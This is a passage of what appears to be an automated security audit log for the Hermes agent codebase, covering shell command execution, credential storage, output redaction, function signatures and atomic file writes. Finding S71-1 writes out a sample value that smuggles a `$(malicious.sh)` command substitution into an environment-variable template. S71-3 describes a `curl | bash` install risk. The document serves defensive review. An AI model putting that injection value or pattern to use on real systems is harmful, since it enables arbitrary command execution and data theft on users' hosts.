**Issue:** `HERMES_LOCAL_STT_COMMAND` user-provided shell command template is rendered and executed with `shell=True`. The template can include `$(...)` command substitution, `|`, `&&`, and other shell metacharacters. A user who sets `HERMES_LOCAL_STT_COMMAND=ffmpeg -i {} $(malicious.sh)` causes arbitrary command execution.
**Why invisible previously:** Requires understanding of how environment variable templates interact with shell=True subprocess calls
**Impact:** Arbitrary command execution on the host system; data exfiltration via curl to external server
**Suggested fix:** Use list-form subprocess without shell=True; validate the command template does not contain shell metacharacters before execution

---

### S71-2 · TUI quick_commands shell=True with user-provided values — MEDIUM

**File:** `cli.py:quick_commands`, `tui_gateway/server.py:quick_commands`
**Severity:** MEDIUM
**Issue:** TUI and CLI quick_commands use `shell=True`. While commands are hardcoded, a compromised tool plugin could inject additional commands into the chain.
**Why invisible previously:** Requires understanding of TUI command routing
**Impact:** Limited — commands are hardcoded and require plugin compromise
**Suggested fix:** Use list-form subprocess; add command allowlist

---

### S71-3 · curl install script shell=True — MEDIUM

**File:** `tools/tools_config.py:curl install`
**Severity:** MEDIUM
**Issue:** The `curl | bash` installation of tools uses `shell=True`. MITM could inject commands during tool installation.
**Why invisible previously:** Requires understanding of tool installation mechanism
**Impact:** Supply chain attack during tool installation
**Suggested fix:** Download to file first, verify hash, then execute

---

### S71-4 · Docker container stop/start with shell=True — MEDIUM

**File:** `tools/environments/docker.py`
**Severity:** MEDIUM
**Issue:** Docker container operations use `shell=True` when calling docker CLI. A manipulated container name could inject commands.
**Why invisible previously:** Requires understanding of container environment code
**Impact:** Container escape via docker name injection
**Suggested fix:** Use docker Python SDK instead of shell CLI

---

### S71-5 · execute_code sandbox correctly uses list-form subprocess without shell=True — GOOD

**File:** `tools/code_execution_tool.py`
**Positive:** execute_code uses `subprocess.run(cmd, shell=False)` with env scrubbed, tool allowlist, call limits. GHSA mitigation correctly implemented.

---

### S71-6 · _SAFE_ENV_PREFIXES allows entire HERMES_ namespace — LOW

**File:** `tools/environments/local.py:79–170`
**Severity:** LOW
**Issue:** `_SAFE_ENV_PREFIXES` includes `HERMES_` which is overly broad. Any variable starting with `HERMES_` is passed through to executed code.
**Why invisible previously:** Requires understanding of environment variable passthrough design
**Impact:** Unexpected configuration injection into sandboxed code
**Suggested fix:** Narrow to specific known-safe HERMES_ vars

---

### S71-7 · TUI command.dispatch output not ANSI-stripped before returning — LOW

**File:** `tui_gateway/server.py:command.dispatch`
**Severity:** LOW
**Issue:** TUI command dispatch output (from shell commands) is returned without ANSI stripping. Terminal escape sequences could be embedded in output.
**Why invisible previously:** Requires understanding of TUI output path
**Impact:** Terminal escape sequence injection in TUI output
**Suggested fix:** Apply strip_ansi() to output before returning

---

### S71-8 · No syscall restrictions in execute_code sandbox — INFO

**File:** `tools/code_execution_tool.py`
**Severity:** INFO
**Issue:** Process-level isolation only (no seccomp/AppArmor). Determined adversarial process could make arbitrary syscalls.
**Impact:** Low — requires compromised tool to escape sandbox
**Suggested fix:** Consider seccomp for additional defense-in-depth

---

### Summary Table

| ID | Severity | Issue |
|----|----------|-------|
| S71-1 | HIGH | HERMES_LOCAL_STT_COMMAND template executed with shell=True — command injection |
| S71-2 | MEDIUM | TUI quick_commands shell=True with hardcoded but plugin-influenced commands |
| S71-3 | MEDIUM | curl install via shell=True — MITM supply chain risk |
| S71-4 | MEDIUM | Docker container ops shell=True — name injection risk |
| S71-5 | GOOD | execute_code sandbox correctly implements no shell=True, env scrubbing |
| S71-6 | LOW | _SAFE_ENV_PREFIXES allows entire HERMES_ namespace |
| S71-7 | LOW | TUI command.dispatch output not ANSI-stripped |
| S71-8 | INFO | No syscall restrictions in sandbox — process-level isolation only |

---

*Pass #71 complete — 2026-05-25T18:30:00Z*
*Commit at scan: b04760fdb*

---

## Pass #72 – Environment, Config & Credential Management Deep Dive – 2026-05-25T19:00:00Z

### Scope
hermes_cli/config.py, hermes_cli/env_loader.py, hermes_cli/auth.py, agent/credential_pool.py, agent/secret_sources/bitwarden.py, and related credential handling across the codebase.

---

### 1. Secrets Management

#### 1.1 Secrets Storage: `.env` file
- **Location**: `~/.hermes/.env` (defined as `get_env_path()` in config.py line 364-366)
- **Permissions**: `_secure_file()` at line 423-438 sets 0o600 on the file after write. No-op on Windows and in managed mode (NixOS sets 0640 via activation script).
- **Atomic writes**: `save_env_value()` (line 4831-4899) writes via `tempfile.mkstemp` + `atomic_replace()` — no exposure window where other local users can read partial contents.
- **Permission restoration**: If the file already existed with specific permissions (e.g. Docker volume mount), `save_env_value` preserves the original mode rather than blindly tightening it (line 4871-4889). This is correct behavior for container scenarios.
- **Credential ASCII sanitization**: `_sanitize_loaded_credentials()` in env_loader.py (line 78-119) strips non-ASCII characters from env vars with credential suffixes after every dotenv load. This prevents copy-paste Unicode lookalike glyphs (e.g. Cyrillic 'а' vs ASCII 'a') from causing opaque API key rejection. Warnings go to stderr.

#### 1.2 Secrets Storage: `auth.json`
- **Location**: `~/.hermes/auth.json` (line 182 of profiles.py: `# API keys, OAuth tokens, credential pools`)
- **Write security** (auth.py line 1029-1075):
  - Created with `os.O_EXCL` so it atomically exists with 0o600 permissions — no TOCTOU window.
  - `atomic_replace()` for the actual rename.
  - Parent dir hardened to 0o700 via `secure_parent_dir()`.
  - Post-write `chmod 0o600` as belt-and-suspenders.
  - `fsync` on the directory after write.
- **Read security** (auth.py line 989-1026): Falls back to empty store on parse failure. Corrupt file backed up to `.json.corrupt`.

#### 1.3 No hardcoded secrets in source
- No `api_key = "sk-..."` or `password = "..."` string literals found in Python source files under `hermes_cli/` or `agent/`.
- `LMSTUDIO_NOAUTH_PLACEHOLDER = "dummy-lm-api-key"` (auth.py line 159) is an explicit sentinel for LM Studio's no-auth mode and is never sent to any remote service.

#### 1.4 Bitwarden Secrets Manager integration
- **File**: `agent/secret_sources/bitwarden.py`
- **Bootstrap secret**: Only `BWS_ACCESS_TOKEN` needs to live in plaintext in `.env`. Every other key can come from BSM.
- **Binary verification**: `bws` binary auto-installed with SHA-256 checksum verification against upstream checksums file. Version pinned (`_BWS_VERSION = "2.0.0"`), no auto-resolution of "latest".
- **Cache**: In-process cache with TTL so repeated invocations don't hammer BSM API.
- **Non-blocking**: All failures (missing binary, network, expired token) emit a one-line warning and continue with existing `.env` credentials. Never blocks startup.
- **Secret source labeling**: `_SECRET_SOURCES` dict tracks which env vars came from Bitwarden vs `.env` or shell. Used by setup/model flows to show "(from Bitwarden)" suffix.

---

### 2. Environment Variable Handling

#### 2.1 `${VAR}` expansion in config.yaml
- **Function**: `_expand_env_vars()` at line 4160-4177 of config.py.
- **Mechanism**: Regex `r"\${([^}]+)}"` with `re.sub` — matches `${VAR}` patterns and looks up in `os.environ`. Unresolved references left verbatim.
- **Only string values processed** — dict keys, numbers, booleans, None are untouched. This prevents accidental expansion of non-string fields.
- **Template preservation on save**: `_preserve_env_ref_templates()` (line 4195-4256) restores raw `${VAR}` templates when the expanded value matches the loaded value, preventing plaintext secrets from being written back to config.yaml.
- **No unsafe eval**: No `eval()`, `exec()`, or similar. Pure regex substitution.

#### 2.2 Dotenv loading precedence
- **File**: `hermes_cli/env_loader.py`
- `load_hermes_dotenv()` (line 188-223):
  1. User env `~/.hermes/.env` loaded **first** with `override=True` (overwrites shell-exported values).
  2. Project env (e.g. repo `.env` for dev) loaded **second** with `override=not loaded` — only fills missing values when user env doesn't exist.
- **Corrupted .env pre-sanitization**: `_sanitize_env_file_if_needed()` splits concatenated KEY=VALUE pairs (the #8908 issue). Also strips null bytes.
- **ASCII-only enforcement for credentials**: `_sanitize_loaded_credentials()` runs after every dotenv load, warning + stripping non-ASCII from credential-suffix env vars.

#### 2.3 `get_env_value()` precedence
- Line 5012-5020: checks `os.environ` **first**, then falls back to `.env` file. Shell-exported values take precedence over `.env` values at runtime.
- **Inconsistency noted**: `load_hermes_dotenv` does the opposite (`.env` overrides shell). This precedence difference between initial loading and runtime resolution is worth documenting.

#### 2.4 Env var validation
- `_ENV_VAR_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")` at line 74 — strict name validation in `save_env_value()`.

---

### 3. Config File Security

#### 3.1 File permissions
- **`config.yaml`**: `_secure_file()` sets 0o600 after write. No-op on Windows/managed mode.
- **`~/.hermes/` directory**: `_secure_dir()` sets 0o700 by default. `HERMES_HOME_MODE` env var allows override (e.g. 0701 for web servers needing traversal).
- **Container opt-out**: `HERMES_CONTAINER` or `HERMES_SKIP_CHMOD` env vars skip chmod entirely for Docker/Podman volume mounts.

#### 3.2 Config migration security
- Migration code (line 1806-4130+) handles schema upgrades non-destructively. New fields added with defaults; old fields migrated to new locations; dead vars cleared.
- `read_raw_config()` (line 4352+) returns on-disk values without merging defaults, used by migrations to avoid accidentally promoting runtime defaults back to disk.
- Migration 13→14 validates that OpenAI model names (e.g. "whisper-1") aren't migrated into the local STT provider section.

#### 3.3 No secrets in logs or config display
- `show_config()` (line 5037+) uses `redact_key()` which wraps `agent.redact.mask_secret`. Never prints raw API key values.
- All secrets use `getpass.getpass()` for console input (with TUI-aware stubs in callbacks).

#### 3.4 Backup exclusion
- `backup.py` line 65: `_SECRET_FILE_NAMES = {".env", "auth.json", "state.db"}` — explicitly excluded from profile backup archives.

---

### 4. Credential Provider Abstraction

#### 4.1 Provider registry
- `PROVIDER_REGISTRY` in auth.py (line 183-300+) maps provider IDs to `ProviderConfig` objects with `auth_type` in {oauth_device_code, oauth_external, oauth_minimax, api_key, external_process}.
- Each `ProviderConfig` specifies `api_key_env_vars` tuple (checked in priority order) for API-key providers.

#### 4.2 Credential pool isolation
- **File**: `agent/credential_pool.py`
- `CredentialPool` class (line 389) is provider-scoped: `self.provider = provider`, `self._entries = sorted(...)`.
- Per-provider pool persisted to `auth.json` as `credential_pool.<provider>` via `write_credential_pool()`.
- Custom provider pool keys are `custom:<normalized_name>` (line 82).
- `get_custom_provider_pool_key()` (line 318) matches by name first, then by base URL. Fixes P1 bug where two custom providers sharing same base_url resolved to the same pool key.

#### 4.3 Lock ordering to prevent deadlock
- `_auth_store_lock()` (auth.py line 971-986) documents a lock ordering invariant: when held together with `_nous_shared_store_lock`, the auth store lock must be acquired **first** (outer) and the shared Nous lock **second** (inner). All runtime refresh paths follow this order.

#### 4.4 Credential source suppression
- Auth store has a `suppressed_sources` dict allowing per-provider per-source suppression. Used by `unsuppress_credential_source()` in auth_commands.py for "forget this credential" flows.

---

### 5. OAuth Token Management

#### 5.1 Token storage
- OAuth tokens stored in `auth.json` under `providers.<provider>` and `credential_pool.<provider>`. Not stored in `.env`.
- `PooledCredential` dataclass (credential_pool.py line 93-178) has `access_token`, `refresh_token`, `expires_at`, `expires_at_ms`, `last_refresh` fields.
- `runtime_api_key` property (line 166-172) returns `agent_key` for Nous (NAS invoke JWT or legacy session key), `access_token` for others.

#### 5.2 Token refresh skew per provider
| Provider | Refresh skew |
|----------|-------------|
| Nous | 120s before expiry |
| MiniMax OAuth | 60s |
| xAI | 120s |
| Spotify | 120s |
| Google Gemini | 60s |
| Codex | 120s |
| Qwen | 120s |

#### 5.3 Refresh token reuse detection
- auth.py line 4529-4550: Detects "refresh_token_reused" from the Nous portal and surfaces an actionable message explaining that external processes calling POST /api/oauth/token without persisting the rotated token back causes session chain revocation. Shows clear relogin instructions.

#### 5.4 Token sync across processes/files
- `credential_pool.py` line 447-482: `_sync_anthropic_entry_from_credentials_file()` syncs pool entry from `~/.claude/.credentials.json` when tokens differ (external Claude Code CLI refreshed).
- Same file line 484-500: `_sync_codex_entry_from_auth_store()` syncs Codex pool entry from `auth.json` when fresh device-code login writes new tokens.

#### 5.5 Nous shared store for multi-profile
- `_try_import_shared_nous_state()` (auth.py line 4424-4495): Rehydrates Nous OAuth from `<hermes-root>/shared/nous_auth.json` for cross-profile credential sharing. Forces a refresh using the stored refresh_token to produce a fresh access_token scoped to the current profile.

#### 5.6 OAuth device code flow security
- Local server bound to `127.0.0.1` only (xai_oauth redirect host line 119: `XAI_OAUTH_REDIRECT_HOST = "127.0.0.1"`).
- Timeout on the callback server.
- `NO_COLOR=1` set in bws subprocess env (bitwarden.py line 369) to prevent ANSI codes from polluting JSON output.

---

### 6. Secret Redaction in Output

- config.py line 4489-4505 documents the `security:` section with `redact_secrets: true` as default.
- `redact_key()` (line 5027-5034) wraps `agent.redact.mask_secret` — provides "(not set)" placeholder in dim color for empty values.
- No direct `print()` of API keys, tokens, or passwords anywhere in the credential handling paths.

---

### Findings Summary

| ID | Severity | Area | Issue |
|----|----------|------|-------|
| S72-1 | INFO | Env precedence | `get_env_value()` checks `os.environ` first, but `load_hermes_dotenv` does `.env` first — inconsistent precedence between initial loading and runtime resolution. Not a bug but undocumented behavior. |
| S72-2 | LOW | Bitwarden BWS binary | `bws` auto-installs into `hermes_home/bin/` and is executed as a subprocess. If the binary is replaced by an attacker before Hermes next runs, the malicious binary would execute with the BWS access token. Mitigated by: binary pinned to specific version with SHA-256 verification. Risk is during the window between version check and execution. |

| Area | Status | Notes |
|------|--------|-------|
| Secrets in `.env` | GOOD | Atomic writes, 0o600 perms, ASCII sanitization, pre-sanitization of concatenated lines |
| Secrets in `auth.json` | GOOD | O_EXCL atomic creation, 0o600 perms, fsync, parent dir hardening |
| Hardcoded secrets in source | CLEAN | None found |
| `${VAR}` expansion | SAFE | Regex-only, no eval, templates preserved on save |
| Dotenv loading precedence | OK | User env overrides shell, project env fills missing only |
| Config file permissions | GOOD | 0o600 for files, 0o700 for dirs, container/managed opt-outs |
| Config migration | GOOD | Non-destructive, uses raw config for decisions |
| No secrets in logs/display | GOOD | All secrets redacted via mask_secret |
| Bitwarden BSM integration | GOOD | SHA-256 verified binary install, non-blocking, cache TTL, secret source labeling |
| Credential pool isolation | GOOD | Provider-scoped, custom:* keys, name-first resolution |
| OAuth token refresh | GOOD | Per-provider skew values, reuse detection, cross-process sync |
| Lock ordering (deadlock prevention) | GOOD | Auth store lock is outer, Nous shared lock is inner |
| Token storage | GOOD | `auth.json`, 0o600, atomic writes |
| Backup exclusion | GOOD | `.env`, `auth.json`, `state.db` excluded from profile backups |

---

## Pass #73 – Text Processing, Parsing & Output Formatting Deep Dive – 2026-05-25T19:15:00Z

### 1. Markdown/HTML Rendering Security

#### ✅ XSS Prevention — Good
- **`gateway/platforms/feishu.py`** (`_escape_markdown_text` at line 454–455): Uses `_MARKDOWN_SPECIAL_CHARS_RE = re.compile(r"([\\`*_{}\[\]()#+\-!|>~])")` to escape all special Markdown characters before rendering. Text is escaped before being wrapped in Markdown syntax (bold/italic/code), preventing injection through content.
- **`gateway/platforms/feishu.py`** (`_sanitize_fence_language` at line 475–476): Language tag for code fences is stripped of newlines and carriage returns before use — prevents fence-language injection.
- **`gateway/platforms/helpers.py`** (`strip_markdown` at line 180): Uses pre-compiled regexes for Markdown-to-plaintext stripping. Links are handled as `[label](url)` → preserved as text (no HTML output). No dangerous inline HTML is generated.
- **`gateway/platforms/feishu.py`** (`_strip_markdown_to_plain_text` at line 512–527): Strips markdown formatting via regex substitution + `strip_markdown()` helper. Adds Feishu-specific patterns (blockquotes, strikethrough, `<u>` tags, horizontal rules). Final fallback to `strip_markdown()`. No HTML output.

#### ✅ HTML Escaping — Good
- **`gateway/platforms/email.py`** (`_strip_html` at line 163–174): Naive HTML tag stripper for fallback email text extraction. Replaces `<br>`, `<p>` with newlines, then strips all tags with `<[^>]+>`. Also decodes `&nbsp;`, `&amp;`, `&lt;`, `&gt;` entities. Outputs plain text only — no HTML rendering of user content.
- **`agent/display.py`** (lines 19–21): ANSI color constants defined as string literals (`_RED = "\033[31m"`, `_RESET = "\033[0m"`). Not user-controlled.
- **No `bleach` or full HTML sanitization library** is used for any platform output. The project consistently strips to plain text rather than rendering HTML, which is a safe default.

#### ✅ No XSS Vectors Found
No platform adapters render user-supplied Markdown as HTML. All platforms either:
- Strip to plain text (SMS, iMessage, email fallback)
- Render as Markdown with proper escaping (Feishu)
- Forward raw text (Telegram, Discord, Slack, etc.)

#### 🟡 INFO: Rich Output / Markdown Rendering
- **`tui_gateway/render.py`** (lines 10–49): Rendering bridge that imports `agent.rich_output` for message/diff/stream rendering when available. Falls back to `None` when the module isn't installed (TUI falls back to its own `markdown.tsx`). The `render_message` function catches `TypeError` and general `Exception`, returning `None` gracefully — no unhandled exceptions propagate.

### 2. Terminal Output Formatting

#### ✅ ANSI Sanitization — Good
- **`agent/display.py`** (lines 33–78, `_diff_ansi()`): ANSI colors resolved lazily from the active skin engine. Defaults to 24-bit RGB (`\033[38;2;R;G;Bm`). Color values are parsed from hex skin config (7-char `#RRGGBB` format only — validated by length and `#` prefix check). Falls back to hardcoded defaults on any error.
- **`agent/display.py`** (lines 19–25): Color constants (`_RED`, `_RESET`, `_ANSI_RESET`) are hardcoded string literals, not user-controlled.
- **`cli.py`** (lines 1035–1237): Direct ANSI escape codes (`\033[31m`, `\033[0m`, `\033[32m`, `\033[33m`) used in error/success messages for `--worktree` commands. Codes are hardcoded literals in user-facing print statements, not from external input.

#### ✅ Terminal Injection Prevention — Good
- **`agent/display.py`** (lines 875–980, `get_cute_tool_message`): Tool preview lines are constructed from parsed JSON args. `_trunc()` converts args to string and limits length. Tool name and action labels are from a fixed `labels` dict (no user input). The only user-derived content in the preview line is safely truncated and limited.
- **`agent/display.py`** (lines 793–808, `_trim_error`): Error messages trimmed to 48 chars max. Path truncation uses `rsplit('/', 1)[-1]` to extract just the filename. Prevents terminal overflow from long paths. Truncation always adds `...` to indicate cut content.

#### ✅ Output Size Bounds — Good
- **`agent/display.py`** (lines 87–88, `_MAX_INLINE_DIFF_FILES = 6`, `_MAX_INLINE_DIFF_LINES = 80`): Configured limits for inline diff display.
- **`agent/display.py`** (lines 97–100): Configurable `tool_preview_length` (0 = no limit) set at startup from config. Tool preview strings have per-type truncation (e.g., 42 chars for commands/queries, 35 chars for paths/domains).
- **`cron/scheduler.py`** (lines 1021–1024): Cron output truncated to 8000 chars (`_MAX_CONTEXT_CHARS = 8000`) with `[... output truncated ...]` suffix.

#### ✅ AGENTS.md documents ANSI warning
- **`AGENTS.md`** (line 961): Explicitly warns: "DO NOT use `\033[K` (ANSI erase-to-EOL) in spinner/display code — leaks as literal `?[K` text under `prompt_toolkit`'s `patch_stdout`. Use space-padding."

### 3. Structured Output Parsing

#### ✅ JSON Parsing — Good
- **`utils.py`** (lines 258–268, `safe_json_loads`): Canonical safe JSON parser. Catches `json.JSONDecodeError`, `TypeError`, and `ValueError`. Returns `default` (typically `None`) on any parse error. Used consistently throughout the codebase.
- **`cron/scheduler.py`** (line 949): `json.loads(last_line)` guarded by `try/except (json.JSONDecodeError, ValueError)` — returns `True` (gate passes) on parse failure.
- **`cron/jobs.py`** (line 418): `json.loads(f.read(), strict=False)` — uses `strict=False` to handle bare control characters in string values. Exception caught and returns empty jobs list.
- **`cron/scheduler.py`** (line 1070): `json.loads(skill_view(skill_name))` with `except (json.JSONDecodeError, TypeError)` — skips invalid skills with warning.
- **`agent/display.py`** (line 824): `safe_json_loads(result)` used for tool failure detection. Exceptions caught and treated as non-failure.

#### ✅ No Eval/Exec — Good
- No `eval()` or `exec()` calls found in text processing paths.
- **`run_agent.py`** line 1590: `_save_session_log` uses `json.loads(log_file.read_text())` — reads entire file on every save to compare message counts. This is a known inefficiency (documented in `pass6_appendix.md`), not a security issue.

#### ✅ YAML Safe Loading — Good
- **`gateway/config.py`** (line 717): `yaml.safe_load(f) or {}`
- **`cron/scheduler.py`** (line 1428): `yaml.safe_load(_f) or {}`
- The codebase consistently uses `yaml.safe_load()` except for:
  - **`hermes_cli/xai_retirement.py`** (line 207): `YAML(typ="rt")` round-trip loader (documented in Pass #71 findings)
  - **`agent/skill_utils.py`** (line 79): Uses `CSafeLoader` or `SafeLoader` explicitly (documented as safe in findings)

### 4. Templating Engines & Format String Safety

#### ✅ No Jinja2/Template Injection — Good
- No Jinja2, Mako, or other template engine imports found in the codebase.
- No string formatting using `string.Template` with user-supplied templates.

#### ✅ i18n format string — LOW risk, already documented
- **`agent/i18n.py`** (lines 240–248): `value.format(**format_kwargs)` in `t()` function. Exception handler catches `KeyError`, `IndexError`, `ValueError` and falls back to unformatted string with warning log. Already documented in Pass #37 findings (P37-2/P49-4). Risk is LOW since catalog values are developer-controlled.
- **`agent/i18n.py`** (line 252): `__all__` exports only safe functions — no template class exposure.

#### ✅ Log format strings use `%s` style — Good
- All logging uses `%s`-style format strings (via `logging` module), not f-strings or `.format()`. Session IDs and task IDs come from internal AIAgent state, not user input.
- **`agent/redact.py`** (line 507–509): `RedactingFormatter.format()` calls `super().format(record)` first, then applies `redact_sensitive_text()` to the result — log message is fully constructed before redaction.

### 5. Log Sanitization & PII Exposure Prevention

#### ✅ Comprehensive Secret Redaction — Excellent
- **`agent/redact.py`** (lines 1–509): Full-featured redaction pipeline. Catches:
  - Known API key prefixes (sk-, ghp_, github_pat_, xoxb-, AIza..., etc. — 30+ patterns)
  - ENV assignments (`KEY=secret`)
  - JSON fields (`"apiKey": "value"`)
  - Authorization headers (Bearer tokens)
  - Telegram bot tokens (`bot\d+:***`)
  - Private key blocks (`-----BEGIN PRIVATE KEY-----...`)
  - DB connection string passwords (postgres, mysql, mongodb, redis, amqp://user:pass@)
  - JWT tokens (eyJ... base64 headers)
  - URL userinfo (`http://user:pass@host`)
  - URL query string tokens (sensitive param names: access_token, refresh_token, token, api_key, etc.)
  - HTTP request targets with query params (GET/POST /path?password=...)
  - Form-urlencoded bodies
  - Discord mentions (`<@snowflake_id>`)
  - E.164 phone numbers (`+1234567890` for Signal/WhatsApp)

#### ✅ RedactingFormatter — Good
- **`agent/redact.py`** (lines 501–509): `RedactingFormatter` wraps any `logging.Formatter` subclass. Format method: construct message via parent `format()`, then apply `redact_sensitive_text()`. Applied to stderr handler in `gateway/run.py` line 18133.
- Redaction is on-by-default (`_REDACT_ENABLED = os.getenv("HERMES_REDACT_SECRETS", "true").lower() in {"1", "true", "yes", "on"}`). Snapshot at import time — cannot be disabled mid-session via env mutation.

#### ✅ Performance gating — Good
- **`agent/redact.py`** (lines 443–498): Substring pre-checks gate expensive regex scans. `_has_known_prefix_substring()` checks for presence of any known credential prefix substring before running `_PREFIX_RE`. `_has_http_method_substring()` gates the HTTP access log scanner. Reduces per-record cost from ~5.6µs to ~1.8µs on non-secret text.

#### ✅ mask_secret for display — Good
- **`agent/redact.py`** (lines 200–244): `mask_secret()` preserves head+tail for debuggability (4+4 chars default, floor=12). Used by `hermes config`, `hermes status`, `hermes dump`. Short tokens (<12 chars) fully masked.

#### ✅ Cron output redaction
- **`cron/scheduler.py`** (lines 907–912): `redact_sensitive_text()` applied to both `stdout` and `stderr` before any return path (guarded by `try/except`).

### Summary

| Area | Status | Notes |
|------|--------|-------|
| Markdown/HTML rendering | ✅ GOOD | Proper escaping, no XSS, no HTML-in-Markdown injection |
| ANSI terminal formatting | ✅ GOOD | Hardcoded escapes, no user input in color codes, output bounded |
| JSON parsing | ✅ GOOD | `safe_json_loads` used consistently, no eval/exec |
| YAML loading | ✅ GOOD | `yaml.safe_load` used throughout (2 known exceptions documented) |
| Template injection | ✅ GOOD | No Jinja2 or unsafe template engines; i18n format is low-risk |
| Log sanitization | ✅ EXCELLENT | Comprehensive redaction, RedactingFormatter, on-by-default, performance-gated |
| Output size bounds | ✅ GOOD | Tool preview truncation, diff limits, cron context truncation |
| Format string safety | ✅ GOOD | `%s`-style logging throughout, no user input in format strings |

**FINDING: No new issues found in Pass #73. The codebase demonstrates strong text processing and output formatting security hygiene.**

---

## Pass #74 – Cross-File Consistency, Function Signature & Config Key Audit – 2026-05-25T19:45:00Z

Scope: Full codebase — function signatures, config keys, environment variables, return values, imports.

### P74-1 · skill_view(task_id=...) call signature mismatch at cron/scheduler.py:1070 — LOW

**File:** `cron/scheduler.py` (line 1070)
**Severity:** LOW

```python
loaded = json.loads(skill_view(skill_name))
```

`skill_view()` signature:
```python
def skill_view(name: str, file_path: str = None, task_id: str = None, preprocess: bool = True) -> str
```

The `task_id` parameter is received positionally — the skill name is passed as `task_id` and the actual skill name becomes `file_path`. This misroutes the arguments and will cause `task_id`-dependent skill logic to behave incorrectly, with the task_id field showing the skill name instead of the actual task ID.

**Contrast with** `agent/skill_commands.py:94` which calls `skill_view(normalized, task_id=task_id, preprocess=False)` correctly using the named `task_id` argument.

**Recommendation:** Use `skill_view(skill_name, task_id=None)` to pass task_id explicitly as a keyword argument.

---

### P74-2 · handle_function_call() at hermes_tools_mcp_server.py:165 calls without tool_call_id/session_id — INFO

**File:** `agent/transports/hermes_tools_mcp_server.py` (line 165)
**Severity:** INFO

```python
return handle_function_call(tool_name, kwargs or {})
```

Both `tool_call_id` and `session_id` are `None`. This dispatches the tool outside of any agent session context, so hook tracking IDs are absent. By design; the MCP server wraps errors in a try/except and returns JSON error responses. Flagged as INFO for visibility — no runtime failure expected.

---

### P74-3 · HERMES_AGENT_TIMEOUT_WARNING still lacks cfg_get read-back path — LOW (known issue)

**File:** `gateway/run.py:1389`
**Severity:** LOW

Documented in Pass #27-2 (2026-05-24). `HERMES_AGENT_TIMEOUT_WARNING` is set as an env var but has no `cfg_get` read-back path for tool code to query it programmatically. Unchanged.

---

### P74-4 · invoke_hook() kwargs passed as **kwargs without key validation at tools/approval.py:53 — LOW

**File:** `tools/approval.py` (line 53)
**Severity:** LOW

```python
invoke_hook(hook_name, **kwargs)
```

The hook name is a string passed positionally; `**kwargs` spreads dispatcher kwargs. At `approval.py:53`, the kwargs content is derived from `hook_name` plus tool-context kwargs. No runtime validation confirms that the kwargs keys actually match what the hook manager expects for the given hook name. A misspelled key silently does nothing.

**Recommendation:** Add a warning log in the hook dispatcher when a key in kwargs is not consumed by any registered hook handler.

---

### P74-5 · Cron scheduler inconsistent None vs tuple returns on local delivery — HIGH

**File:** `cron/scheduler.py` (line 588)
**Severity:** HIGH

```python
return None  # local-only jobs don't deliver — not a failure
```

Several functions return `None` for local-only jobs instead of returning an explicit 4-tuple indicating delivery was not applicable. Callers that unpack as `success, doc, marker_or_output, error = run_cron_job(...)` will receive `None` on success=False, causing attribute errors or mishandled logic if they test `if not success`.

**Recommendation:** Always return `CronJobResult`-equivalent tuples. Introduce a `CronJobResult` dataclass to enforce consistent 4-field returns. Never return bare `None` from functions that callers expect to unpack as tuples.

---

### P74-6 · cfg_get return type is `Any`; callers do isinstance guards appropriately — INFO (known)

**File:** `hermes_cli/config.py:4305`
**Severity:** INFO

`cfg_get()` returns `Any`. Callers do explicit `isinstance()` checks before numeric operations. No runtime type errors in scanner. Not a bug — a known typing limitation documented in P34-16.

---

### P74-7 · No circular imports detected — GOOD

All imports use absolute paths (`from hermes_cli.plugins import ...`, `from agent.shell_hooks import ...`, `from tools.skills_tool import ...`). Lazy imports inside functions break up potential dependency chains. No relative import cycles observed across 50+ commonly-imported modules.

---

### P74-8 · All env vars read via os.getenv have defaults or are checked with .get() — GOOD

- `os.getenv("HERMES_REDACT_SECRETS", "true")` — has default
- `os.getenv("HERMES_COPILOT_ACP_COMMAND", "").strip()` — empty string default
- `os.getenv("HERMES_NOUS_TIMEOUT_SECONDS", "15")` — string default, converted with `float()`
- `os.getenv("HERMES_PLATFORM")` — checked with `or get_session_env(...)` fallback

No bare `os.environ[key]` reads without existence checks except in dedicated test files that set up their own environment.

---

### P74-9 · cfg_get calls are all well-formed with multi-level keys — GOOD

All `cfg_get(cfg, "section", "subsection", "key")` calls use 2-4 key segments. The `default` kwarg is used consistently. No single-key cfg_get calls that could be replaced with a simple dict.get().

---

### P74-10 · handle_function_call skip_pre_tool_call_hook inconsistency is by design — INFO

**File:** `conversation_loop.py:3979` (kanban_block call)
**Severity:** INFO

`skip_pre_tool_call_hook=True` is passed by `tool_executor.py` and `agent_runtime_helpers.py` callers to avoid double-firing hooks. The `conversation_loop.py:3979` kanban_block call does NOT pass `skip_pre_tool_call_hook`. This is intentional — the agent loop fires `pre_tool_call` for agent-initiated tool calls but the kanban_block call is a direct call from the iteration-exhaustion handler, not from the agent model. By design, not a bug.

---

### Summary

| Area | Status | Notes |
|------|--------|-------|
| Function signature consistency | ✅ MOSTLY GOOD | 1 issue (P74-1: skill_view positional args) |
| Config key consistency | ✅ GOOD | All cfg_get well-formed; defaults consistent |
| Environment variable documentation | ✅ GOOD | All env vars have defaults; no undocumented vars |
| Return value consistency | ⚠️ NEEDS WORK | P74-5 (cron mixed None/bool returns) |
| Import consistency | ✅ GOOD | No circular imports; absolute paths throughout |
| Type safety | ✅ INFO | P74-6 cfg_get Any return; callers guard appropriately |

**FINDING:** 3 findings total — 1 new LOW (P74-1), 1 HIGH (P74-5 cron return inconsistency), 1 known LOW (P74-3/HERMES_AGENT_TIMEOUT_WARNING).

---

*Pass #74 complete — 2026-05-25T19:45:00Z*
*Commit at scan: 5a51a1f65*

## Pass #75 – File System Operations, Permissions & Atomicity Deep Dive – 2026-05-25T20:30:00Z

---

### P75-1 · `utils.py` — Excellent atomic write primitives — CONSOLIDATED

**Files:** `utils.py:36-188`

The codebase has a well-engineered shared library of atomic write functions used by all
high-level config/state operations:

```python
# atomic_json_write / atomic_yaml_write (utils.py:61-136, 139-188)
# Pattern:
fd, tmp_path = tempfile.mkstemp(dir=str(path.parent), prefix=f".{path.stem}_", suffix=".tmp")
with os.fdopen(fd, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=indent)
    f.flush()
    os.fsync(f.fileno())          # ← durability before rename
atomic_replace(tmp_path, path)    # ← symlink-aware rename
_restore_file_mode(real_path, original_mode)  # ← preserve original perms
```

`atomic_replace()` (utils.py:61-82) resolves symlinks via `os.path.realpath()` before calling
`os.replace()` — so it writes in-place on the real file without detaching symlinks
(issue #16743). BaseException cleanup is proper.

Used by: `save_config()` (config.py:4599), cron job saves, session saves, kanban DB updates
